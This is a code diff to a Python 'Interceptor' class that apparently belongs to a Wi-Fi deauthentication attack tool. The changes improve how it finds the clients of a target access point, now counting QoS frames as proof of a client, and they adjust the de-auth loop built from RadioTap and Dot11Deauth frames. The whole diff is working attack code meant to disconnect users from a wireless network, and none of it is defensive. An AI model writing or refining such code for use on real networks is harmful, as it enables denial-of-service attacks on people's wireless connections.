@@ -94,6 +94,8 @@ class Interceptor:
                 if ssid not in self._active_aps:
                     self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num)
                     # printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
+            else:
+                self._clients_sniff_cb(pkt)  # pass forward to find potential clients
         except:
             pass
 
@@ -140,18 +142,18 @@ class Interceptor:
         try:
             if self._packet_confirms_client(pkt):
                 ap_mac = str(pkt.addr3)
-                ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
-                if ssid == self.target_ssid:
+                if ap_mac == self._active_aps[self.target_ssid]["mac_addr"]:
                     c_mac = pkt.addr1
-                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
-                        self._active_aps[ssid]["clients"].append(c_mac)
+                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[self.target_ssid]["clients"]:
+                        self._active_aps[self.target_ssid]["clients"].append(c_mac)
         except:
             pass
 
     @staticmethod
     def _packet_confirms_client(pkt):
         return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
-               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0)
+               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
+               pkt.haslayer(Dot11QoS)
 
     def _listen_for_clients(self):
         printf(f"[*] Setting up a listener for new clients...")
@@ -161,7 +163,7 @@ class Interceptor:
         try:
             printf(f"[*] Starting de-auth loop...")
 
-            ap_mac = [self._active_aps[self.target_ssid]["mac_addr"]]
+            ap_mac = self._active_aps[self.target_ssid]["mac_addr"]
 
             rd_frm = RadioTap()
             deauth_frm = Dot11Deauth(reason=7)
